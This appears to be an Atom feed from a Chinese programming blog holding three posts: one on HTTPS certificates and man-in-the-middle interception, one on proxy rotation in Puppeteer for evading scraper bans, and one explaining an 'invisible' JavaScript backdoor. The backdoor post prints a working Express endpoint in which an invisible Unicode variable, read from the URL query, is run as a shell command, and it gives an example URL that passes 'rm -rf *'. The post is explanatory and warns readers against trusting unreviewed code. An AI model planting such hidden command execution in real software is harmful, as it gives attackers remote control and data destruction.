<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>谢乾坤 | Kingname</title>
  
  <subtitle>给时光以生命。</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.kingname.info/"/>
  <updated>2021-12-23T03:05:23.644Z</updated>
  <id>https://www.kingname.info/</id>
  
  <author>
    <name>谢乾坤 | Kingname</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>HTTPS 证书和中间人攻击的原理</title>
    <link href="https://www.kingname.info/2021/12/23/reason-for-mitm/"/>
    <id>https://www.kingname.info/2021/12/23/reason-for-mitm/</id>
    <published>2021-12-23T03:04:04.000Z</published>
    <updated>2021-12-23T03:05:23.644Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-11-07-17-02-03.png" alt="香格里拉古镇里面的牛肉火锅"></p><p>有同学在知识星球和公众号粉丝群里面提到，希望我讲一讲 HTTPS 证书、为什么使用 Charles、Fiddler、MitmProxy 抓 HTTPS 的请求要安装证书、 requests 发送请求的时候，verify 参数除了 False/True 还能填写什么参数。今天我们就这几个问题来做一个简单的介绍。</p><a id="more"></a><p>首先我们定义几个术语：</p><ul><li>公钥：一串字符串，在非对称加密里面用来加密数据，随意公开。</li><li>私钥：一串字符串，在非对称加密里面用来解密数据，不能泄露。根据私钥可以反推出公钥。</li><li>普通密钥：一串字符串。在对称加密里面，加密和解密都用它。</li></ul><p>首先关于HTTPS 链接的创建流程，网上已经有太多文章来介绍了。网上给出的流程，大概是这样的：</p><ol><li>客户端发送请求到服务器。</li><li>服务器把自己的公钥下发给客户端。</li><li>客户端使用这个公钥加密一个普通的密钥，并发送给服务器。</li><li>服务器使用私钥解密出这个普通的密钥。</li><li>接下来所有的请求都由这个普通的密钥通过对称加密来实现。</li></ol><p>并且，这些文章一般还会说道，对称加密速度快，但是加密解密使用的是同一个密钥。当你要传输这个密钥的时候可能会泄露；非对称加密，公钥可以随意公开，公钥加密，私钥解密。安全性高但是速度慢。所以 HTTPS 使用非对称加密用来传输普通密钥。这个普通密钥再来传输正常的数据。</p><p>这个流程看起来没有什么问题，也很合理。但是，它漏掉了一个很重要的东西：如何识别信息有没有被篡改或者监听？</p><p>我们说 HTTPS 协议正常情况下是不怕窃听的，也就是说，我即使在你家路由器上面安装一个监控程序，也无法监听到你的数据。但是上面这个流程，无法推导出这个结论：</p><p>如果我在你家的路由器上面安装了一个中间人监控的程序。那么，你的客户端第一次往服务器发送请求的时候，我就知道你要请求哪个网站了，这个时候，我首先假装服务器，让你把请求信息都发给我。然后我再假装客户端，把你的请求信息转发给服务器。服务器的公钥下发下来以后，监控程序保留这个公钥。监控程序自己也有一套公钥、私钥。他把自己的公钥发送给你。你以为这个公钥是服务器的，但实际上它是监控程序的。你用这个公钥加密普通密钥，监控程序能就使用自己的私钥来解密，拿到真正的对称加密的密钥。然后它再把普通密钥用服务器下发的公钥加密，传给服务器。接下来，服务器解密以后，用这个普通密钥加密数据，和它以为的客户端正常通信。</p><p>在这个过程中，客户端和服务器，完全不知道自己都在跟一个中间人进行通信。那么数据就这样轻易被监听了。</p><p>这样一来，HTTPS 的安全性意义在哪里？难道你要给监听的人说：你等一下，等我跟服务器交换完密钥以后，你再来监听？</p><p>使用 HTTPS，应该能保证，只要客户端和服务器是正常的，那么监听程序在中间的任何环节出现，我都不害怕。</p><p>HTTPS 之所以能这样保证，是因为它使用的是<a href="https://zh.wikipedia.org/wiki/X.509" target="_blank" rel="noopener">符合X.509标准的证书</a>，而不仅仅是公钥和私钥。</p><blockquote><p>国际电信联盟设计了一套专门针对证书格式的标准X.509，其核心提供了一种描述证书的格式。</p><p>X.509数字证书不仅包括用户名和密码，而且还包含了与用户有关的其他信息，通过使用证书，CA可以为证书接收者提供一种方法，使他们不仅信任证书主体的公钥，而且还信任有关证书主体的其他信息。</p></blockquote><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-11-07-14-40-02.png" alt></p><p>证书本质上就是一个文本文件。但是这个文件里面记录了很多其他信息，包括这个证书是谁颁发的，过期时间等等。</p><p>我们知道，要生成一个 SSL 证书，在 Linux 里面就是一条命令而已，非常简单。但是，国际电信联盟提供了一批值得信任的证书颁发机构，只有使用这些机构颁发的证书，浏览器才认为是安全的，才会出现绿色的锁。否则，如果你使用的不是认证机构颁发的证书，或者干脆你是自己一条命令生成的证书，那么当你访问网站的时候，就会变成下面这样：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-11-07-15-15-46.png" alt></p><p>这是因为，浏览器不知道你现在这个网站的证书，是真正服务器就用的自签证书，还是被中间人替换了。所以会给你发报警。如果你确认服务器就是这个自签证书，那么你就可以点<code>高级</code>-<code>继续访问</code>，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-11-07-15-18-10.png" alt></p><p>访问成功以后，浏览器地址栏也会提示你请求不安全：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-11-07-15-21-02.png" alt></p><p>如果你用 requests 请求这个网站，也会报错，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-11-07-15-20-12.png" alt></p><p>我们知道，requests 可以设置参数<code>verify=False</code>来强行访问使用了非认证机构颁发的证书的网站：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-11-07-15-23-28.png" alt></p><p>这里的<code>verify=False</code>，其实就相当于我们在浏览器上面点击了<code>高级</code>-<code>继续访问</code>。</p><p>除此之外，requests 的<code>verify</code>参数，还可以填写成一个文件地址：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-11-07-15-37-10.png" alt></p><p>这里的这个<code>test.cer</code>文件，就是我在使用<code>openssl</code>生成网站自签证书的时候，一并自动生成的。它同时包含了公钥和私钥。它长下面这样：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-11-07-15-40-00.png" alt></p><p>我们再来看看 Charles 的根证书：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-11-07-15-53-54.png" alt></p><p>他们的格式是一样的。所以，当我们要使用 Charles/Fiddler/MitmProxy 抓HTTPS 的时候，需要信任根证书，实际上就相当于使用<code>requests</code>的时候，把<code>verify=</code>设置为根证书的地址。</p><p>为什么 Charles 的根证书被信任了以后就可以抓包了？为什么requests 指定了根证书以后，访问使用自签证书的 https 网站就不报错了？这是因为，我们现在有办法可以检测数据是否被篡改过。</p><p>现在话又要说回私钥和公钥了。我们都知道，公钥可以对数据进行加密，私钥对数据进行解密。但是实际上，我们还可以用私钥对数据进行“加密”，公钥进行“解密”！注意这里的<code>加密</code>和<code>解密</code>，我打了引号，是因为准确的说，应该叫做用私钥对数据明文的摘要加密得到数字签名，用公钥可以验证这个数字签名是不是自己对应的那个私钥生成的。</p><p>服务器发给客户端的数据，除了客户端索要的数据外，还包括一份经过签名的摘要数据。客户端收到数据以后，用公钥就可以从签名里面解析出客户端需要的数据对应的摘要。客户端再把自己收到的数据使用摘要算法计算出一个摘要，两边一对比，就知道数据有没有被篡改。</p><p>自签证书不能伪装成可信机构签发的证书，就在于证书里面有一段数字签名，可信任机构颁发的证书，这个签名都是唯一的，自签证书如果修改了机构信息，那么新的摘要信息就跟那么这个数字签名解密后的摘要信息不匹配了。于是浏览器就会给你发出警报。</p><p>但当你信任了一个根证书以后，浏览器就不会发送警报了。所以如果你安装了来路不明的证书，那么你的客户端和服务器的通信就可能会被监听。</p><p>如果你看明白这篇文章，那么你应该会知道，如果你想使用 Charles 等等抓包工具，那么，根证书应该是安装到你的客户端。而不是安装到电脑上。例如你想抓手机的数据包，那么你应该把根证书安装到手机上，而不是安装到运行 Charles 的电脑上。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-11-07-17-02-03.png&quot; alt=&quot;香格里拉古镇里面的牛肉火锅&quot;&gt;&lt;/p&gt;
&lt;p&gt;有同学在知识星球和公众号粉丝群里面提到，希望我讲一讲 HTTPS 证书、为什么使用 Charles、Fiddler、MitmProxy 抓 HTTPS 的请求要安装证书、 requests 发送请求的时候，verify 参数除了 False/True 还能填写什么参数。今天我们就这几个问题来做一个简单的介绍。&lt;/p&gt;
    
    </summary>
    
      <category term="知识" scheme="https://www.kingname.info/categories/%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="HTTPS" scheme="https://www.kingname.info/tags/HTTPS/"/>
    
      <category term="中间人攻击" scheme="https://www.kingname.info/tags/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>一日一技：亲眼所见，也非真实，如何明目张胆架设后门程序</title>
    <link href="https://www.kingname.info/2021/12/23/backdoor-for-review/"/>
    <id>https://www.kingname.info/2021/12/23/backdoor-for-review/</id>
    <published>2021-12-23T02:55:43.000Z</published>
    <updated>2021-12-23T02:59:23.907Z</updated>
    
    <content type="html"><![CDATA[<p>以前有人说，开源项目非常安全，因为谁都可以看到代码，所以不怕里面藏有后门。</p><p>这样的言论显然非常天真，一来，并不会有很多人真的去看源代码；二来，有一些缺陷隐藏得很深，光看源代码看不出来，例如 log4j2；第三，有办法把后门藏在一段非常安全的代码里面，你即使看源代码也看不出哪里有问题。</p><a id="more"></a><p>今天这个案例，是我在网上闲逛(mo yu)的时候偶然发现的，它的做法非常精巧，可以称得上是光明正大开后门。</p><p>案例文章的原始地址是：<a href="https://certitude.consulting/blog/en/invisible-backdoor/" target="_blank" rel="noopener">The Invisible JavaScript Backdoor</a>这篇文章给出了一段看起来非常安全的Node.js 的代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> util = <span class="built_in">require</span>(<span class="string">'util'</span>);</span><br><span class="line"><span class="keyword">const</span> exec = util.promisify(<span class="built_in">require</span>(<span class="string">'child_process'</span>).exec);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/network_health'</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; timeout,ㅤ&#125; = req.query;</span><br><span class="line">    <span class="keyword">const</span> checkCommands = [</span><br><span class="line">        <span class="string">'ping -c 1 google.com'</span>,</span><br><span class="line">        <span class="string">'curl -s http://example.com/'</span>,ㅤ</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> <span class="built_in">Promise</span>.all(checkCommands.map(<span class="function"><span class="params">cmd</span> =&gt;</span> </span><br><span class="line">                cmd &amp;&amp; exec(cmd, &#123; <span class="attr">timeout</span>: +timeout || <span class="number">5</span>_000 &#125;)));</span><br><span class="line">        res.status(<span class="number">200</span>);</span><br><span class="line">        res.send(<span class="string">'ok'</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">        res.status(<span class="number">500</span>);</span><br><span class="line">        res.send(<span class="string">'failed'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">8080</span>);</span><br></pre></td></tr></table></figure><p>这段代码使用 Express 框架搭建了一个 API 接口，当你调用<code>http://127.0.0.1:8080/network_health</code>的时候，后台会首先<code>ping</code>一下 Google，然后再使用<code>curl</code>访问<code>http://example.com</code>。如果都成功了，那么显然你的网络是正常的，于是给你返回<code>ok</code>。你也可以设置参数<code>timeout=xxx</code>来限定这两个测试必需在多长时间内完成，否则视为网络有问题。</p><p>这个功能简单得不能再简单了，能有什么问题呢？我现在就把代码放到你的面前让你来Review，你能说我的代码有问题？</p><p>但实际上，上面这段代码确实有一个后门，可以让我在部署了这个接口的机器上执行任意命令，包括但不限于下载木马或者<code>rm -rf *</code>。</p><p>这段代码的问题，就出现在图中我画箭头的这两个地方：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-12-22-20-18-10.png" alt></p><p>这两个地方的逗号后面，并不是空格，而是一个看不见的符号：<code>\u3164</code>。我们知道，在 JavaScript 里面，几乎任何非关键字的Unicode 符号都可以用来当做变量名。而<code>\u3164</code>也是一个 Unicode 字符，所以它显然也可以当做变量名。</p><p>我们来看上面代码中，执行命令的地方：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> checkCommands = [</span><br><span class="line">        <span class="string">'ping -c 1 google.com'</span>,</span><br><span class="line">        <span class="string">'curl -s http://example.com/'</span>,ㅤ</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> <span class="built_in">Promise</span>.all(checkCommands.map(<span class="function"><span class="params">cmd</span> =&gt;</span> </span><br><span class="line">                cmd &amp;&amp; exec(cmd, &#123; <span class="attr">timeout</span>: +timeout || <span class="number">5</span>_000 &#125;)));</span><br></pre></td></tr></table></figure><p>这里，Node.js 会调用系统 Shell 执行数组<code>checkCommands</code>中的<code>两条</code>命令。如果我这样写：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> hide_command = <span class="string">'rm -rf *'</span></span><br><span class="line"><span class="keyword">const</span> checkCommands = [</span><br><span class="line">        <span class="string">'ping -c 1 google.com'</span>,</span><br><span class="line">        <span class="string">'curl -s http://example.com/'</span>,ㅤhide_command</span><br><span class="line">    ];</span><br></pre></td></tr></table></figure><p>那你肯定知道我执行了三条命令，其中第三个命令会删除电脑里面的文件。现在，我把里面的名字<code>hide_command</code>换成<code>\u3164</code>:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> ㅤ = <span class="string">'rm -rf *'</span></span><br><span class="line"><span class="keyword">const</span> checkCommands = [</span><br><span class="line">        <span class="string">'ping -c 1 google.com'</span>,</span><br><span class="line">        <span class="string">'curl -s http://example.com/'</span>,ㅤ</span><br><span class="line">    ];</span><br></pre></td></tr></table></figure><p>你虽然可能会觉得<code>const ㅤ = &#39;rm -rf *&#39;</code>有点奇怪，但你应该不会怀疑下面的数组有什么问题。因为在你的眼里，这个数组<strong>只有</strong>两条命令，但它实际上有三条命令。</p><p>而这段攻击代码，把<code>const ㅤ = &#39;rm -rf *&#39;</code>这个奇怪的赋值语句也给隐藏到了<code>const { timeout,ㅤ} = req.query;</code>当中。因为在 Express 中，我们可以这样设置 URL 参数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;id, name, type&#125; = req.query;</span><br></pre></td></tr></table></figure><p>那么，你在 URL 里面就可以使用这三个参数：<code>http://127.0.0.1:8000/network_health?id=xxx&amp;name=yyy&amp;type=zzz</code>。现在，这段有后门的代码，其实会接收两个参数，分别是<code>timeout</code>和<code>ㅤ</code>，其中后者这个看起来像是空格的就是<code>\u3164</code>，也就是变量名。所以，我可以通过访问 URL：<code>http://127.0.0.1:8000/network_health?timeout=10&amp;ㅤ=rm -rf *</code>。把删除系统文件的命令传入进来。这里可以传入任何 Shell 命令，如果不想删除对方的系统，那么可以通过执行 Shell 下载一个木马程序到对方的电脑上，然后就可以每天远程偷偷监控对方在干什么了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这样的后门真的是防不胜防。我也没有什么好办法能避免被欺骗。例如你在Github 上面看到有人开源了一个基于 Node.js 实现的电商系统，于是你就把它拿来用，搭建出了你自己的在线商城卖点小东西。也许某一天，你会发现你的账目对不上，也许就是因为这个系统里面留有这样的后门？</p><p>只能说最好的办法就是不要运行来历不明的代码，也不要因为代码是开源项目，就盲目觉得它很安全。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;以前有人说，开源项目非常安全，因为谁都可以看到代码，所以不怕里面藏有后门。&lt;/p&gt;
&lt;p&gt;这样的言论显然非常天真，一来，并不会有很多人真的去看源代码；二来，有一些缺陷隐藏得很深，光看源代码看不出来，例如 log4j2；第三，有办法把后门藏在一段非常安全的代码里面，你即使看源代码也看不出哪里有问题。&lt;/p&gt;
    
    </summary>
    
      <category term="JavaScript" scheme="https://www.kingname.info/categories/JavaScript/"/>
    
    
      <category term="JavaScript" scheme="https://www.kingname.info/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>一日一技：Puppeteer 不重启如何更换代理 IP</title>
    <link href="https://www.kingname.info/2021/12/23/puppeteer-change-proxy/"/>
    <id>https://www.kingname.info/2021/12/23/puppeteer-change-proxy/</id>
    <published>2021-12-23T02:55:22.000Z</published>
    <updated>2021-12-23T02:58:32.889Z</updated>
    
    <content type="html"><![CDATA[<p>我们知道，在写爬虫的过程中，如果总是使用同一个 IP，很容易就会被网站识别并封禁，所以需要使用代理 IP 并经常更换。</p><a id="more"></a><p>但如果你在网上搜索 Puppeteer 如何更换代理 IP，你会发现，网上的解决方案一般是这样写的：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">'puppeteer'</span>);</span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span>() =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.launch(&#123;</span><br><span class="line">    args: [ <span class="string">'--proxy-server=123.45.67.89:8888'</span> ]</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage();</span><br><span class="line">  <span class="keyword">await</span> page.goto(<span class="string">'http://httpbin.org/ip'</span>);</span><br><span class="line">  <span class="keyword">await</span> browser.close();</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>这种写法有一个问题，如果你要更换 IP，必须重启爬虫。那么有没有办法不重启爬虫也能更换代理 IP 呢？</p><p>方法有，并且有两个。</p><h2 id="隧道代理"><a href="#隧道代理" class="headerlink" title="隧道代理"></a>隧道代理</h2><p>对一些网站来说，只要每次访问的 IP 不一样就可以避免被封禁，那么我们可以使用隧道代理。隧道代理供应商会给我们提供一个唯一的域名和端口。我们把它设置为爬虫的代理就可以了。代理供应商会在后端自动给每一次请求更换 IP，不用我们来操心。</p><p>我们使用<a href="https://www.qg.net/business/proxyip/42.html" target="_blank" rel="noopener">青果云</a>的隧道代理来做演示。它可以免费试用2小时。我获取到的代理 IP 地址为：<code>http://D5A913AF:B1DE2C46D321@tunnel.qg.net:11151</code>。于是，我可以修改上面的 Puppeteer 代码中的 IP 地址：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">'puppeteer-core'</span>);</span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span>() =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.launch(&#123;</span><br><span class="line">    args: [ <span class="string">'--proxy-server=tunnel.qg.net:11151'</span> ], <span class="attr">headless</span>: <span class="literal">false</span>, <span class="attr">executablePath</span>: <span class="string">'/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge'</span>&#125;);</span><br><span class="line">  <span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage();</span><br><span class="line">  <span class="keyword">await</span> page.authenticate(&#123;<span class="attr">username</span>: <span class="string">'账号'</span>, <span class="attr">password</span>: <span class="string">'密码'</span>&#125;);  <span class="comment">// 如果代理没有权限验证，可以移除这一行</span></span><br><span class="line">  response = <span class="keyword">await</span> page.goto(<span class="string">'http://httpbin.org/ip'</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'第一次访问: '</span>, <span class="keyword">await</span> response.text());</span><br><span class="line">  response = <span class="keyword">await</span> page.goto(<span class="string">'http://httpbin.org/ip'</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'第二次访问: '</span>, <span class="keyword">await</span> response.text());</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-12-19-11-05-57.png" alt></p><h2 id="动态按需修改代理-IP"><a href="#动态按需修改代理-IP" class="headerlink" title="动态按需修改代理 IP"></a>动态按需修改代理 IP</h2><p>IP 并不是换得越频繁越好。如果网站需要登录，那么你登录以后每一次请求都更换 IP，这反而会弄巧成拙，让网站更加怀疑你是不是爬虫。还有一些网站，例如淘宝，当你访问一个页面的时候，它会自动301跳转多次。在这几次跳转的时候，你必须保持 IP 一致，否则它就会屏蔽你。</p><p>我们有时候需要实现按需更换代理 IP——让开发者在需要更换 IP 的时候，再来更换。</p><p>为了让 Puppeteer 实现这个目标，我们可以安装一个第三方模块：<code>puppeteer-page-proxy</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i puppeteer-page-proxy</span><br></pre></td></tr></table></figure><p>安装完成以后，我们来使用看看：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">'puppeteer-core'</span>)</span><br><span class="line"><span class="keyword">const</span> useProxy = <span class="built_in">require</span>(<span class="string">'puppeteer-page-proxy'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puppeteer.launch(&#123;<span class="attr">headless</span>: <span class="literal">false</span>, <span class="attr">executablePath</span>: <span class="string">'/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge'</span>&#125;).then(</span><br><span class="line">    <span class="keyword">async</span> browser =&gt; &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'start...'</span>)</span><br><span class="line">        <span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> useProxy(page, <span class="string">'http://账号:密码@119.5.228.105:21477'</span>)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'change proxy success, start to visit url'</span>)</span><br><span class="line">        resp = <span class="keyword">await</span> page.goto(<span class="string">'http://httpbin.org/ip'</span>)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">await</span> resp.text())</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> useProxy(page, <span class="string">'http://账号:密码@119.41.199.19:56214'</span>)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'change proxy success, start to visit url'</span>)</span><br><span class="line">        resp = <span class="keyword">await</span> page.goto(<span class="string">'http://httpbin.org/ip'</span>)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">await</span> resp.text())</span><br><span class="line">        &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-12-19-11-22-37.png" alt></p><p>当我们需要更换 IP 的时候，只需要在代码里面执行<code>await useProxy(page, &#39;http://账号:密码@IP:端口&#39;)</code>，就可以更换新的 IP 了。如果你的代理 IP 没有账号密码，那么可以把代码改成：<code>await useProxy(page, &#39;http://IP:端口&#39;)</code>。</p><p>可能有人会问，你上面的示例代码中，你是直接把代理填写到代码里面的。如果我需要访问某个 URL 来获取新的代理怎么办呢？其实这也很简单，你可以再安装一个第三方模块：<code>axios</code>用来发起网络请求获取新的代理 IP，然后再替换:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i axios</span><br></pre></td></tr></table></figure><p>还是以青果云的短效代理 IP 为例，它可以提供一个接口，访问接口后，你能得到一个有效期5-15分钟的短效 IP，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-12-19-11-29-14.png" alt></p><p>开通试用账号以后，你可以获得一个提取代理的 URL，类似于下面这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://proxy.qg.net/extract?Key=ABCDEFGH&amp;Num=1&amp;AreaId=&amp;Isp=&amp;DataFormat=txt&amp;DataSeparator=%5Cn&amp;Detail=0</span><br></pre></td></tr></table></figure><p>访问以后就能拿到代理IP，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-12-19-11-34-37.png" alt></p><p>现在，我们要在 Puppeteer 里面，先访问这个 URL 获取代理，再把代理IP 设置到 Puppeteer 中，然后再访问目标网页。对应的代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">'puppeteer-extra'</span>)</span><br><span class="line"><span class="keyword">const</span> useProxy = <span class="built_in">require</span>(<span class="string">'puppeteer-page-proxy'</span>)</span><br><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">'axios'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">set_proxy</span>(<span class="params">page</span>)</span>&#123;</span><br><span class="line">    resp = <span class="keyword">await</span> axios.get(<span class="string">'https://proxy.qg.net/extract?Key=ABCDEFG&amp;Num=1&amp;AreaId=&amp;Isp=&amp;DataFormat=txt&amp;DataSeparator=%5Cn&amp;Detail=0'</span>)</span><br><span class="line">    proxy = <span class="string">'http://账号:密码@'</span> + resp.data</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'获取到的代理 IP 为：'</span>, proxy)</span><br><span class="line">    <span class="keyword">await</span> useProxy(page, proxy)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">puppeteer.launch(&#123;<span class="attr">headless</span>: <span class="literal">false</span>, <span class="attr">executablePath</span>: <span class="string">'/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge'</span>&#125;).then(</span><br><span class="line">    <span class="keyword">async</span> browser =&gt; &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'start...'</span>)</span><br><span class="line">        <span class="keyword">const</span> [page] = <span class="keyword">await</span> browser.pages()</span><br><span class="line">        <span class="keyword">await</span> set_proxy(page)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'change proxy success, start to visit url'</span>)</span><br><span class="line">        resp = <span class="keyword">await</span> page.goto(<span class="string">'http://httpbin.org/ip'</span>)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">await</span> resp.text())</span><br><span class="line">&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-12-19-11-49-40.png" alt></p>]]></content>
    
    <summary type="html">
    
